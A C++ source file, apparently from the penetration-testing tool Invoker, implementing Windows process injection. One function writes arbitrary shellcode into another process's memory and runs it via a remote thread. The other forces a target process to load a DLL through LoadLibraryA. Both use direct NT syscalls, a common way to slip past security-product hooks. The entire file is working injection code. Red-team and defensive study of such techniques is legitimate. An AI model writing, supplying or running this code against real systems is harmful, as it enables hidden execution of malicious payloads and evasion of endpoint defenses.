// Copyright (c) 2021 Ivan Šincek
// v4.2.1

#include ".\invoker_syscalls.h"
#include ".\syscalls.h"

// --------------------------------------- SECTION: BYTECODES

bool DSCInjectBytecode(DWORD pid, std::string bytecode) {
	bool success = false;
	HANDLE hProcess = NULL;
	OBJECT_ATTRIBUTES attr = { 0 };
	InitializeObjectAttributes(&attr, NULL, 0, NULL, NULL);
	CLIENT_ID client = { (PVOID)pid, 0 };
	NtOpenProcess(&hProcess, (PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD), &attr, &client);
	if (hProcess == NULL) {
		printf("Cannot get the process handle\n");
	}
	else {
		LPVOID addr = NULL;
		size_t size = bytecode.length();
		NtAllocateVirtualMemory(hProcess, &addr, 0, &size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
		if (addr == NULL) {
			printf("Cannot allocate the additional process memory\n");
		}
		else {
			size_t bytes = 0;
			NtWriteVirtualMemory(hProcess, addr, (PVOID)bytecode.c_str(), bytecode.length(), &bytes);
			if (bytes < 1) {
				printf("Cannot write to the process memory\n");
			}
			else {
				HANDLE hThread = NULL;
				NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, (LPTHREAD_START_ROUTINE)addr, NULL, FALSE, 0, 0, 0, NULL);
				if (hThread == NULL) {
					printf("Cannot start the process thread\n");
				}
				else {
					success = true;
					printf("Bytecode has been injected successfully\n");
					NtClose(hThread);
				}
			}
			NtFreeVirtualMemory(hProcess, &addr, 0, MEM_RELEASE);
		}
		NtClose(hProcess);
	}
	return success;
}

// --------------------------------------- SECTION: DLLS

bool DSCInjectDLL(DWORD pid, std::string file) {
	bool success = false;
	HANDLE hProcess = NULL;
	OBJECT_ATTRIBUTES attr = { 0 };
	InitializeObjectAttributes(&attr, NULL, 0, NULL, NULL);
	CLIENT_ID client = { (PVOID)pid, 0 };
	NtOpenProcess(&hProcess, (PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD), &attr, &client);
	if (hProcess == NULL) {
		printf("Cannot get the process handle\n");
	}
	else {
		LPVOID addr = NULL;
		size_t size = file.length();
		NtAllocateVirtualMemory(hProcess, &addr, 0, &size, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
		if (addr == NULL) {
			printf("Cannot allocate the additional process memory\n");
		}
		else {
			size_t bytes = 0;
			NtWriteVirtualMemory(hProcess, addr, (PVOID)file.c_str(), file.length(), &bytes);
			if (bytes < 1) {
				printf("Cannot write to the process memory\n");
			}
			else {
				HMODULE hLib = GetModuleHandleA("kernel32.dll");
				if (hLib == NULL) {
					printf("Cannot get the handle of \"kernel32.dll\"\n");
				}
				else {
					LPTHREAD_START_ROUTINE lpRoutine = (LPTHREAD_START_ROUTINE)GetProcAddress(hLib, "LoadLibraryA");
					if (lpRoutine == NULL) {
						printf("Cannot get the address of LoadLibraryA()\n");
					}
					else {
						HANDLE hThread = NULL;
						NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, lpRoutine, addr, FALSE, 0, 0, 0, NULL);
						if (hThread == NULL) {
							printf("Cannot start the process thread\n");
						}
						else {
							success = true;
							printf("DLL has been injected successfully\n");
							NtClose(hThread);
						}
					}
				}
			}
			NtFreeVirtualMemory(hProcess, &addr, 0, MEM_RELEASE);
		}
		NtClose(hProcess);
	}
	return success;
}
